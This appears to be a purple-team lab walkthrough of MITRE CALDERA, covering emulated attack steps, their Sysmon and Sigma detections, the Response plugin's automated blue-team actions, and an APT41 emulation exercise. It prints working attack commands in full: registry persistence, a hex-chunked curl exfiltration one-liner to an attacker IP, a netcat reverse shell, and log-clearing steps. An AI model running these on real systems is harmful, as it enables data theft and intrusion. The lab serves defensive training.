  ProcessGuid {c5d2b969-73ec-67ea-4901-000000002901} 
  ProcessId 2796 
  Image C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe 
  Company Microsoft Corporation 
  OriginalFileName PowerShell.EXE 
  CommandLine powershell.exe -ExecutionPolicy Bypass -C "Set-ItemProperty \"HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\\\" \"Shell\" \"explorer.exe, C:\Windows\System32\cmd.exe\" -Force" 
  ParentProcessId 5464 

```

Sysmon. Registry Value Set 13

```
RuleName T1060 
  EventType SetValue 
  UtcTime 2025-03-31 10:52:28.664 
  ProcessId 2796 
  Image C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe 
  TargetObject HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell 
  Details explorer.exe, C:\Windows\System32\cmd.exe 
  User VICTIM\Administrator 

```

### Discover: Identify local users

Sysmon Log: Event ID 1

```
 UtcTime 2025-03-31 10:52:49.498 
  ProcessId 960 
  Image C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe  
  OriginalFileName PowerShell.EXE 
  CommandLine powershell.exe -ExecutionPolicy Bypass -C "Get-WmiObject -Class Win32_UserAccount" 
  User VICTIM\Administrator 
  ParentProcessId 5464 

```

### Collection: Zip a Folder with PowerShell for Staging in Temp

Sysmon Log. Process Creation

```
UtcTime 2025-03-31 10:53:10.602 
  ProcessId 2112 
  Image C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe 
  OriginalFileName PowerShell.EXE 
  CommandLine powershell.exe -ExecutionPolicy Bypass -C "Compress-Archive -Path $env:USERPROFILE\Downloads -DestinationPath $env:TEMP\exfil.zip -Force" 
  User VICTIM\Administrator 
  ParentProcessId 5464 
  ParentImage - 

```

Aurora Agent: Rule Matched:

```
1. Sigma rule match found: Folder Compress To Potentially Suspicious Output Via Compress-Archive Cmdlet
		Match_Strings: 'Compress-Archive -Path $env:USERPROFILE\\Downloads -DestinationPath $env:TEMP' in CommandLine
2. Sigma rule match found: Zip A Folder With PowerShell For Staging In Temp - PowerShell 
		Match_Strings: 'Compress-Archive -Path $env:USERPROFILE\\Downloads -DestinationPath $env:TEMP' in Data
		
```

### Exfiltration: Exfiltrating Hex-Encoded Data Chunks over HTTP

Sysmon Log: Process Creation

```
UtcTime 2025-03-31 10:53:31.707 
  ProcessGuid {c5d2b969-742b-67ea-4c01-000000002901} 
  ProcessId 1052 
  Image C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe 
  OriginalFileName PowerShell.EXE 
  CommandLine powershell.exe -ExecutionPolicy Bypass -C "$file=\"$env:TEMP\exfil.zip\"; $destination=\"http://10.10.39.5:8080/\"; $bytes=[System.IO.File]::ReadAllBytes($file); $hex=($bytes|ForEach-Object ToString X2) -join ''; $split=$hex -split '(\S{20})' -ne ''; ForEach ($line in $split) { curl.exe \"$destination$line\" } echo \"Done exfiltrating the data. Check your listener.\"" 
  ParentProcessId 5464 

```

Process Creation. All the next 23 Curl.exe Process execution is to exfiltrate the file

<img width="855" height="683" alt="image" src="https://github.com/user-attachments/assets/d6321d35-00f7-4a3a-9613-849ec760e431" />

Then, 23 network connections are made to the attacker's machine

<img width="838" height="699" alt="image" src="https://github.com/user-attachments/assets/51a5766b-0a62-4398-9895-60b4d79eb4fc" />

After the exfiltration is done, the cleanup command is executed

```
UtcTime 2025-03-31 10:55:12.814 
  ProcessId: 5116 
  Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe 
  OriginalFileName: PowerShell.EXE 
  CommandLine: powershell.exe -ExecutionPolicy Bypass -C "Remove-Item -Path $env:TEMP\exfil.zip -ErrorAction Ignore" 
  ParentProcessId: 5464 
  
```

**Process Creation:**

```
 UtcTime 2025-03-31 10:55:13.917 
  ProcessGuid {c5d2b969-7491-67ea-6501-000000002901} 
  ProcessId 5824 
  Image C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe 
  OriginalFileName PowerShell.EXE 
  CommandLine powershell.exe -ExecutionPolicy Bypass -C "Remove-ItemProperty -Path \"HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\\\" -Name \"Shell\" -Force -ErrorAction Ignore" 
  ParentProcessId 5464 

```

**Registry Object Deleted or added: EventID 12**

```
 RuleName T1060 
  EventType DeleteValue 
  UtcTime 2025-03-31 10:55:14.179 
  ProcessGuid {c5d2b969-7491-67ea-6501-000000002901} 
  ProcessId 5824 
  Image C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe 
  TargetObject HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell 
  User VICTIM\Administrator 

```

**Process Create**

```
 RuleName - 
  UtcTime 2025-03-31 10:55:15.019 
  ProcessId 5508 
  Image C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe 
  OriginalFileName: PowerShell.EXE 
  CommandLine: powershell.exe -ExecutionPolicy Bypass -C "Remove-Item $env:TEMP\PhishingAttachment.xlsm -ErrorAction Ignore" 

```

**Aurora Agent Rule Matched:**

```
1. Sigma rule match found: HackTool - CrackMapExec PowerShell Obfuscation 
		Match_Strings: 'join \'\'; $split' in CommandLine, \powershell.exe in Image, PowerShell.EXE in OriginalFileName
```

## Autonomous Incident Response

Leverage CALDERA from the perspective of a blue teamer. Credentials for Blue teamer account: 

- username: blue
- password: admin

Note that the theme has changed to blue color and one of the tabs has changed from adversaries to defenders.

<img width="405" height="735" alt="image" src="https://github.com/user-attachments/assets/e902dfc5-c09e-4119-aa12-52a50ce68e13" />

The topics will be discussed in this task:

1. Introduction to the Response plugin.
2. Sources and Facts.
3. Incident Response Scenario
4. Running blue operations and reviewing results.

### Introduction to the Response plugin.

The Response plugin is the counterpart of the threat emulation plugins of CALDERA. It contains abilities that focus on detection and response actions

<img width="1596" height="697" alt="image" src="https://github.com/user-attachments/assets/b68b4995-d4ff-43f4-816e-5b95ad6bd333" />

In the version of CALDERA used in this task, there are currently thirty-seven abilities and four defenders. As mentioned above, defenders are the counterpart of adversaries, which means these are the blue team profiles that contain abilities that execute detection and response actions. The current defenders available in this version are the following:

- Incident Responder
- Elastic Hunter
- Query Sysmon
- Task Hunte

**Response Plugin Abilities:** You may view the abilities available for the plugin by navigating to the abilities tab and filtering it with the response plugin, similar to the image below

<img width="321" height="202" alt="image" src="https://github.com/user-attachments/assets/8fb06d46-2121-4137-88d5-17f92cf0bc1d" />

<img width="1834" height="694" alt="image" src="https://github.com/user-attachments/assets/7bfe86b2-6b44-4b8e-aa8c-eb1c51e7293f" />

Compared to the adversaries' abilities that are mapped with MITRE ATT&CK Tactics and Techniques, the Response Plugin Abilities are classified by four different tactics, such as:

- **Setup** - Abilities that prepare information, such as baselines, that assists other abilities in determining outliers.
- **Detect** - Abilities that focus on finding suspicious behaviour by continuously acquiring information. Abilities under this tactic have the Repeatable field configured, meaning they will run and hunt as long as the operation runs.
- **Response** - Abilities that act on behalf of the user to initiate actions, such as killing a process, modifying firewall rules, or deleting a file.
- **Hunt** - Abilities that focus on searching for malicious Indicators of Compromise (IOCs) via logs or file hashes.

**Defender Profile**

There are fource defenders profile, we will focus on the Response profile. 

<img width="1801" height="593" alt="image" src="https://github.com/user-attachments/assets/40ff07bd-7aa2-4e2d-ae29-475ea61b8716" />

This profile contains abilities under three different tactics **(detection, hunt, response)**

<img width="1655" height="736" alt="image" src="https://github.com/user-attachments/assets/58839b1f-9f8d-45c4-acb9-d41d095c3301" />

Some abilities are connected: “**to unlock, you need the key**.”

<img width="1549" height="611" alt="image" src="https://github.com/user-attachments/assets/182cbafe-3f52-406c-8c7f-fa60c44ef94b" />

<img width="1536" height="608" alt="image" src="https://github.com/user-attachments/assets/a6224f9a-3ad4-418c-aa8a-f7fbaac541a5" />

the `Find unauthorized processes` ability unlocks the `remote.port.unauthorized` value, which is required by the  `Enable Outbound TCP/UDP firewall rule` ability to execute blocking unauthorized network connections successfully. 

**Key > unlock** 

- `Find unauthorized processes` > `Enable Outbound TCP/UDP firewall rule`
- `Find atypical open ports` > `Kill Rouge Process`
- `Hunt for known suspicious files` > `Delete known suspicious files`

**Reviewing Abilities**

Reviewing the commands executed by the abilities helps in understanding the commands executed and adjusting the configuration if needed. For example: check `Unauthorized process ability` Command for Windows platform

<img width="1085" height="568" alt="image" src="https://github.com/user-attachments/assets/9025fbc4-d7a9-4bab-ab99-e923a6691feb" />

The command attempts to look for TCP connections with a specific outbound port and returns the process that initiated the network connection. You may see that it uses the `remote.port.unauthorized` value for the `-RemotePort` parameter.  However, this ability does not require any prerequisite abilities before its execution, which means it uses a **fact** preconfigured in our CALDERA instance. 

### Sources and Facts

As mentioned above, one of the abilities is using a fact during an operation. 

- **Facts** are identifiable pieces of data. May it be acquired by agents during the execution of abilities or loaded from preconfigured settings.
- **Sources** are groups of facts.

<img width="1793" height="706" alt="image" src="https://github.com/user-attachments/assets/336ea7c7-a1b5-494b-8292-d413f193a4e4" />

<img width="1597" height="461" alt="image" src="https://github.com/user-attachments/assets/7fdf220a-9a92-40d6-b1bf-8e130ae22cf5" />

The source **response** has four facts, one of which is `remote.port.unauthorized` , which flags three ports as unauthorized: **7010, 7011, 7012.** We can add port 4444 as an unauthorized remote port.

<img width="459" height="336" alt="image" src="https://github.com/user-attachments/assets/6d6b2503-5101-4708-b13c-15402bea2876" />

This is how the ability `Find unauthorized processes` will execute on the target machine

```powershell
# Execution N.1
Get-NetTCPConnection -RemotePort "7010" -EA silentlycontinue | where-object { write-host $_.OwningProcess }

# Execution N.2
Get-NetTCPConnection -RemotePort "7011" -EA silentlycontinue | where-object { write-host $_.OwningProcess }

# Execution N.3
Get-NetTCPConnection -RemotePort "7012" -EA silentlycontinue | where-object { write-host $_.OwningProcess }

# Execution N.4
Get-NetTCPConnection -RemotePort "4444" -EA silentlycontinue | where-object { write-host $_.OwningProcess }

```

### Incident Response Scenario

Simulate a simple Incident Response scenario to trigger some of the abilities included in the **Incident Responder** profile. 

**First**: Establish a reverse shell from our victim machine to our AttackBox instance.

Attack Machine

```bash
nc -lvp 4444 -s $(hostname -I | awk '{print $1}')
```

Victim Machine

```powershell
PS C:\Tools> .\nc.exe 10.10.39.5 4444 -e cmd.exe
```

<img width="1591" height="530" alt="image" src="https://github.com/user-attachments/assets/fe809d36-d772-4c2e-b6bf-cd012a859a26" />

Now, let's execute the response operation and observe the behaviour 

### Running Blue operation

**Second**: deploy a new blue agent

<img width="1062" height="491" alt="image" src="https://github.com/user-attachments/assets/f41f81eb-5e38-44d0-aa42-bfdda41f2fd9" />

Choose the blue-team agent reverse shell

<img width="1071" height="510" alt="image" src="https://github.com/user-attachments/assets/9c7fcbed-8b37-43a1-96c1-d6ec08a1c292" />

Execute it on the victim machine.

<img width="996" height="293" alt="image" src="https://github.com/user-attachments/assets/137d6214-3fce-4d8c-8314-96de927ef992" />

The Agent is now active

<img width="1401" height="453" alt="image" src="https://github.com/user-attachments/assets/24087d28-307a-48b2-a0db-08bb6affe869" />

**Third**: Create a new blue operation

<img width="728" height="690" alt="image" src="https://github.com/user-attachments/assets/a4d7e283-ff98-40a4-9280-2c5a1a6d578f" />

Start the operation.

<img width="1744" height="799" alt="image" src="https://github.com/user-attachments/assets/f1825613-3e09-46e2-9a83-7af5934e3a78" />

The output of `Find unauthorized processes` ****ability

<img width="1111" height="220" alt="image" src="https://github.com/user-attachments/assets/56ce3c52-b9df-4089-8b43-4f0ca859b39e" />

<img width="1108" height="596" alt="image" src="https://github.com/user-attachments/assets/a33a1f93-0cee-4148-9678-40ec23917429" />

the output of `Enable Outbound TCP/UDP firewall rule` ability

<img width="1233" height="262" alt="image" src="https://github.com/user-attachments/assets/9891c96d-24ed-4d9b-a04c-922c4711b340" />

```powershell

New-NetFirewallRule -DisplayName "Block out-bound UDP traffic to port 4444 from PID 4572" -Group "Caldira" -Direction Outbound -Protocol UDP -Action Block -RemotePort 4444;New-NetFirewallRule -DisplayName "Block out-bound TCP traffic to port 4444 from PID 4572" -Group "Caldira" -Direction Outbound -Protocol TCP -Action Block -RemotePort 4444;

```

<img width="1110" height="640" alt="image" src="https://github.com/user-attachments/assets/3485261a-c0f3-4ce3-8c8b-8277400510d1" />

The output of `Kill rogue process` response ability

<img width="1209" height="273" alt="image" src="https://github.com/user-attachments/assets/57a51d47-3646-4596-b994-744a50db30b6" />

<img width="1651" height="325" alt="image" src="https://github.com/user-attachments/assets/30103704-2e67-4f26-9bd2-3b6c78e0d3da" />

The malicious process has been successfully killed. 

# Case Study: Emulating APT41

## Purple Team Exercise: Emulation of APT41

In this scenario, you are tasked to emulate the known TTPs of APT41 in your organization's infrastructure to test your security defences against threat actors known to target similar sectors, such as Healthcare, Telecommunications, and Technology.

| **Tactic** | **Technique** | Ability Name |
| --- | --- | --- |
| Initial Access | Spearphishing Attachment (T1566.001) | Download Macro-Enabled Phishing Attachment |
| Execution | Windows Management Instrumentation (T1047) | Create a Process using obfuscated Win32_Process |
| Execution | Service Execution (T1569.002) | Execute a Command as a Service |
| Persistence | Scheduled Task/Job: Scheduled Task (T1053.005) | Powershell Cmdlet Scheduled Task |
| Persistence | Local Account (T1136.001) | Create a new user in a command prompt |
| Defense Evasion | Clear Windows Event Logs (T1070.001) | Clear Logs (using wevtutil) |
| Discovery | File and Directory Discovery (T1083) | File and Directory Discovery (PowerShell) |
| Collection | Data from Local System (T1005) | Find files |

You need to use the red account again to execute the TTPs. In addition, ensure that your HTTP listener (on port 8080) on AttackBox is still running.

**Operation Guidelines**

You may follow these guidelines, which is a summary of the methodology covered from the previous tasks:

- Create a new threat profile and select all TTPs mentioned above.
- Establish a connection to the target machine via an agent.
- Start emulating the threat profile and observe the execution of each technique.
- Document and review the results.

## Agent Configuration

Login to Red account and create a new agent

<img width="1108" height="628" alt="image" src="https://github.com/user-attachments/assets/0d354327-935c-4a28-97af-f556d41f7de3" />

Copy the reverse shell

<img width="1063" height="506" alt="image" src="https://github.com/user-attachments/assets/214cc8ae-45e2-4be5-8ed3-de40efad1d57" />

Paste it to the victim machine

<img width="985" height="255" alt="image" src="https://github.com/user-attachments/assets/96ca3e19-ada5-4895-a216-8fc54dea5472" />

<img width="1144" height="77" alt="image" src="https://github.com/user-attachments/assets/201c86ea-7e68-453a-8bdf-55a6bbed846a" />

Create a threat profile and add the listed abilities mentioned above; make sure the abilities are configured correctly.

<img width="1149" height="593" alt="image" src="https://github.com/user-attachments/assets/25706fba-591a-409d-b325-caef99c0830b" />

<img width="1656" height="721" alt="image" src="https://github.com/user-attachments/assets/d181b7e2-0f53-449a-91ae-68a564f3a47a" />

Create and start a new operation, but before that, make sure the Sysmon log and Application log are cleared

<img width="863" height="673" alt="image" src="https://github.com/user-attachments/assets/118b6d1a-0300-434f-9f40-34176b7533e4" />

<img width="881" height="262" alt="image" src="https://github.com/user-attachments/assets/eae70a3f-fc7b-4d21-985f-870f99eb0187" />

### Initial Access: Download Macro-Enabled Phishing Attachment

<img width="970" height="738" alt="image" src="https://github.com/user-attachments/assets/7b528373-b308-4588-8760-5be5d1097070" />

<img width="818" height="333" alt="image" src="https://github.com/user-attachments/assets/3dd9d39d-c549-4ea8-971c-dae0d41e52b2" />

**Aurora Rule Matched:**

```
Sigma rule match found: Suspicious Invoke-WebRequest Execution With DirectIP 
Sigma rule match found: PowerShell Web Download
Sigma rule match found: Change PowerShell Policies to an Insecure Level 
Sigma rule match found: Usage Of Web Request Commands And Cmdlets
```

### Execution: Create a Process using obfuscated Win32_Process

<img width="1135" height="446" alt="image" src="https://github.com/user-attachments/assets/6ddf1a1b-c37c-4d78-ab61-689533a221ca" />

**Sysmon log**

<img width="889" height="660" alt="image" src="https://github.com/user-attachments/assets/49302c0a-1131-4937-9630-fd579aa618da" />

**Spawned Process:**

<img width="869" height="673" alt="image" src="https://github.com/user-attachments/assets/aa87ec3b-061c-40a2-a0ee-c7ab60c3a49b" />

<img width="798" height="100" alt="image" src="https://github.com/user-attachments/assets/ea3b3fc2-7ebc-4892-9aa1-6f14ec24fcc7" />

**Aurora Matched Rules**

```powershell
Sigma rule match found: WmiPrvSE Spawned A Process
		Match_Strings: \WmiPrvSE.exe in ParentImage
```

### Execution: Execute a Command as a Service

<img width="1086" height="370" alt="image" src="https://github.com/user-attachments/assets/953ff041-ef4a-4680-8e07-c9aedfb49d7c" />

Sysmon log

<img width="834" height="652" alt="image" src="https://github.com/user-attachments/assets/19b59866-e9dc-4820-a62c-a332fa5003d8" />

**Aurora Matched Rule**

```
Sigma rule match found: Change PowerShell Policies to an Insecure Level
		Match_Strings: '-ExecutionPolicy ' in CommandLine, Bypass in CommandLine, \powershell.exe in Image, PowerShell.EXE in OriginalFileName
```

### Persistence: PowerShell Cmdlet Scheduled Task

<img width="1103" height="510" alt="image" src="https://github.com/user-attachments/assets/cd15928f-6612-4c93-8cdb-be588dd184c0" />

**Sysmon Log:**

<img width="852" height="663" alt="image" src="https://github.com/user-attachments/assets/f4daa322-5640-4214-b279-72b2dea36c49" />

**Aurora Rule Matched:**

```
Sigma rule match found: Powershell Create Scheduled Task 
		Match_Strings: register-ScheduledTask in ScriptBlockText, register-ScheduledTask in ScriptBlockText

```

```powershell
PS C:\Tools> Get-ScheduledTask -TaskName "AtomicTask" |fl *

State                 : Ready
Actions               : {MSFT_TaskExecAction}
Author                :
Date                  :
Description           :
Documentation         :
Principal             : MSFT_TaskPrincipal2
SecurityDescriptor    :
Settings              : MSFT_TaskSettings3
Source                :
TaskName              : AtomicTask
TaskPath              : \
Triggers              : {MSFT_TaskLogonTrigger}
URI                   : \AtomicTask
Version               :
PSComputerName        :
CimClass              : Root/Microsoft/Windows/TaskScheduler:MSFT_ScheduledTask
CimInstanceProperties : {Actions, Author, Date, Description...}
CimSystemProperties   : Microsoft.Management.Infrastructure.CimSystemProperties

```

### Persistence: Create a new user in a command prompt

<img width="1091" height="589" alt="image" src="https://github.com/user-attachments/assets/0cef36b9-38ce-444f-8da1-4aae005a61aa" />

Sysmon log

<img width="878" height="676" alt="image" src="https://github.com/user-attachments/assets/e72dd542-e2ca-48fb-a23a-3b79fc50e32a" />

<img width="792" height="468" alt="image" src="https://github.com/user-attachments/assets/4216f820-28d8-4e25-89cd-2f957464bba5" />

**Aurora Rule Matched**

```
Sigma rule match found: New User Created Via Net.EXE 
		Match_Strings: user in CommandLine, add in CommandLine, \net.exe in Image, net.exe in OriginalFileName
```

### Defence Evasion: Clear Log

<img width="1164" height="702" alt="image" src="https://github.com/user-attachments/assets/0e21543a-d246-4f57-9c33-45ba51ed420a" />

**Sysmon log**

<img width="864" height="685" alt="image" src="https://github.com/user-attachments/assets/a5cc94e3-7ec2-4f2c-a4fa-330d7f525e2d" />

**Aurora Rule Matched:**

```
Sigma rule match found: Suspicious Eventlog Clearing or Configuration Change Activity
		Match_Strings: ' cl ' in CommandLine, \wevtutil.exe in Image 

```

### Discovery: File and Directory Discovery (PowerShell)

<img width="1081" height="397" alt="image" src="https://github.com/user-attachments/assets/530a09c2-c4b8-422f-94b8-b95b2c71cd8c" />

<img width="838" height="610" alt="image" src="https://github.com/user-attachments/assets/649f19d6-e570-40b3-adbd-185f324f0c98" />

**Aurora Rule Matched**

```
Sigma rule match found: Change PowerShell Policies to an Insecure Level 
		Match_Strings: '-ExecutionPolicy ' in CommandLine, Bypass in CommandLine, \powershell.exe in Image, PowerShell.EXE in OriginalFileName
```

### Collection: Find Files

For the last ability, click on **Run** to run the rest of the operation instead of **Run 1 Link**, because the last ability needs to run multiple times, and if you click on **Run 1 Link**, it will repeat the process.

<img width="965" height="340" alt="image" src="https://github.com/user-attachments/assets/afa7b6fa-8f78-43e0-8b74-8bc44794cd11" />
